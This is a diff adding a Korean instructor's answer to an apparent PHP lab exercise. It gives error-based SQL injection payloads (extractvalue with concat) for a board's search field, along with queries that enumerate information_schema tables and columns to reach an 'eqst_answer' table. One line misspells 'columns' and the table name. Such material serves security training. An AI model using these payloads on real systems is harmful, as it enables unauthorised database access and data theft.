@@ -1,0 +1,58 @@
+PHP 문제 8번 강사님 답안
+
+
+함수: extractvalue(rand(), concat(0x3a, (__공격 쿼리) ))--
+
+select 컬럼 1~? from 게시판
+where 제목 like '%__검색어__%'
+
+공격구문: dd%' and extractvalue(rand(), concat(0x3a, (__공격 쿼리) )) and '1%' = '1
+
+select count(table_name) from information_schema.tables
+
+select count(table_name) from information_schema.tables where table_schema = database();
+
+dd%' and extractvalue(rand(), concat(0x3a, (select count(table_name) from information_schema.tables) )) and '1%' = '1
+
+
+1-2) 테이블 1 row -> limit __어디부터, __몇개__
+
+dd%' and extractvalue(rand(), concat(0x3a, (select count(table_name) from information_schema.tables limit 0,1) )) and '1%' = '1
+
+select table_name from information_schema.tables
+
+1 : access_log
+2: comm_file
+3: comm_mdi_file
+4: eqst_answer
+5: member
+6: notice
+7: zipcode
+
+
+2. 컬럼
+
+select column_name from information_schema.coumns where table_name = 'eqst_anwer'
+
+2-1)  컬럼의 개수: 1개
+
+select count(column_name) from information_schema.columns where table_name = 'eqst_answer'
+
+dd%' and extractvalue(rand(), concat(0x3a, (select count(column_name) from information_schema.columns where table_name = 'eqst_answer') )) and '1%' = '1
+
+2-2) 컬럼 : answer_column
+
+select column_name from information_schema.columns where table_name = 'eqst_answer'
+
+dd%' and extractvalue(rand(), concat(0x3a, (select column_name from information_schema.columns where table_name = 'eqst_answer'
+) )) and '1%' = '1
+
+
+
+
+
+
+
+
+
+
